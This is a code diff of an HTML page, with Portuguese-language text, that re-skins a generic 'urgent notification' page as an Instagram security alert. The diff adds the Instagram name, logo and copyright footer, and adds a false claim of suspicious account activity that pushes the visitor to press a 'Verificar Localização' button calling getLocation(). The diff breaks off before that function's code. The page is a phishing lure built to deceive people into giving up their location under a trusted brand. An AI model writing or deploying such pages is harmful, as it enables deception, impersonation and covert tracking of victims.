@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Notificação Urgente</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <title>Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -12,45 +12,63 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f7f7f7;
+            background-color: #fafafa;
             margin: 0;
         }
         .container {
             background: white;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
             padding: 20px;
             max-width: 400px;
+            width: 90%;
             text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
-        h1 {
-            color: #d9534f;
-            font-size: 24px;
+        .logo {
+            margin-bottom: 20px;
         }
-        p {
-            color: #555;
-            margin: 15px 0;
+        .logo img {
+            width: 100px;
+        }
+        .message {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 20px;
         }
         button {
-            background-color: #d9534f;
+            background-color: #0095f6;
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-size: 16px;
+            padding: 10px 16px;
+            border-radius: 4px;
+            font-size: 14px;
             cursor: pointer;
+            width: 100%;
         }
         button:hover {
-            background-color: #c9302c;
+            background-color: #007bbf;
+        }
+        .footer {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Notificação Urgente</h1>
-        <p>Para sua segurança, precisamos verificar sua localização atual. Clique no botão abaixo para continuar.</p>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/512px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
+        </div>
+        <div class="message">
+            Detectamos uma atividade suspeita em sua conta. Para garantir que sua conta esteja segura, confirme sua localização clicando no botão abaixo.
+        </div>
         <button onclick="getLocation()">Verificar Localização</button>
         <p id="demo"></p>
+        <div class="footer">
+            © 2024 Instagram
+        </div>
     </div>
     <script>
         function getLocation() {
